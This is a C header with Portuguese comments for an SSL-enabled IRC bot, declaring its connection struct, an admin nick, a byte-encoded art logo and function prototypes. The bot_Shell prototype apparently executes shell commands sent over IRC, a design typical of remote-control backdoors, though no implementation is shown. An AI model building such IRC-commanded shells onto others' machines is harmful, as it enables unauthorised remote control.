/*

  Definições de estrutura de dados e protótipos.

*/

/* Bot art logo */
char bot_Brand[] = {
  226, 150, 170, 32, 32, 226, 150, 132, 226, 150, 
  132, 226, 150, 132, 32, 32, 32, 226, 150, 132, 
  226, 150, 132, 194, 183, 32, 226, 150, 132, 226, 
  150, 132, 226, 150, 132, 226, 150, 132, 194, 183, 
  32, 10, 226, 150, 136, 226, 150, 136, 32, 226, 
  150, 128, 226, 150, 132, 32, 226, 150, 136, 194, 
  183, 226, 150, 144, 226, 150, 136, 32, 226, 150, 
  140, 226, 150, 170, 226, 150, 144, 226, 150, 136, 
  32, 226, 150, 128, 226, 150, 136, 226, 150, 170, 
  10, 226, 150, 144, 226, 150, 136, 194, 183, 226, 
  150, 144, 226, 150, 128, 226, 150, 128, 226, 150, 
  132, 32, 226, 150, 136, 226, 150, 136, 32, 226, 
  150, 132, 226, 150, 132, 226, 150, 144, 226, 150, 
  136, 226, 150, 128, 226, 150, 128, 226, 150, 136, 
  226, 150, 132, 10, 226, 150, 144, 226, 150, 136, 
  226, 150, 140, 226, 150, 144, 226, 150, 136, 226, 
  128, 162, 226, 150, 136, 226, 150, 140, 226, 150, 
  144, 226, 150, 136, 226, 150, 136, 226, 150, 136, 
  226, 150, 140, 226, 150, 136, 226, 150, 136, 226, 
  150, 132, 226, 150, 170, 226, 150, 144, 226, 150, 
  136, 10, 226, 150, 128, 226, 150, 128, 226, 150, 
  128, 46, 226, 150, 128, 32, 32, 226, 150, 128, 
  194, 183, 226, 150, 128, 226, 150, 128, 226, 150, 
  128, 32, 194, 183, 226, 150, 128, 226, 150, 128, 
  226, 150, 128, 226, 150, 128, 32, 00
};

/* bot adm nick */
#define BOT_ADM "stackiller"

/* obtém o tamanho do ponteiro do array. */ 
#define ARRAY_SIZE(x) ((sizeof(x)) / (sizeof(x[0])))

/* Estrutura de dados IRC */
typedef struct {
  SSL_CTX *ctx; // ponteiro de contexto ssl.
  SSL *ssl; // descritor ssl.
  int sockfd; // descrito do socket.
  char *host, *port; // host e porta.
  char *nick, *pass; // nick e pass.
  char *chans, *buffer; // canais e buffer.
} irc_d;

/* Protótipos das funções */
SSL_CTX* init_Ctx(void); // inicializa um novo contexto ssl.
void show_Certs(SSL*); // mostra os certificados ssl.

int new_Conn(const char*, int); // cria um socket.

int str_Cmp(char*, char*); // compara duas strings.
int matrix_haveNull(char**, int); // checa se uma matriz tem algum elemento nulo.
void matrix_Destroy(char **, int); // destrói uma matriz.
void release(void *ptr); // libera um ponteiro.

char* r_Buffer(void); // lê o buffer.
void msg_Send(char*); // envia uma mensagem para o servidor irc.

char* get_Dst(char*); // obtém o destinatário.
char* get_Msg(char*); // obtém a mensagem.
char* get_Src(char*); // obtém a origem.
char* get_nArg(char*, int); // obtém n arg.
char* get_Args(char*); // obtém todos os argumentos da mensagem.

int bot_Exec(char*, char*, char*); // controla os comandos a serem executados pelo bot.

int bot_Pong(char*); // pong.
void bot_Nick(char*); // nick.
void bot_Creds(char*, char*); // credenciais.
void bot_Join(char*); // join
void bot_Priv(char*, char*); // privmsg
void bot_Part(char*); // part.

void bot_Shell(char*, char*); // executa comandos do shell.

void bot_Header(void); // header do bot.
void usage(char*); // modo de usar.

// Tamanhos
#define BUFFER_SIZE 512 * 11
#define BUFFER_LINE_SIZE 512
#define BOT_MAX_LEN 50

// Erros
#define FAIL -1
#define FAIL_SOCK "[!] Falha ao criar o socket o__O"
#define FAIL_CONN "[!] Falha na conexão, tente novamente :P"

// Cores
#define tRed "\e[91m"
#define tGreen "\e[92m"
#define tYellow "\e[93m"
#define tBlue "\e[94m"
#define tCyan "\e[96m"

#define tRs "\e[0m"
#define tBlink "\e[5m"
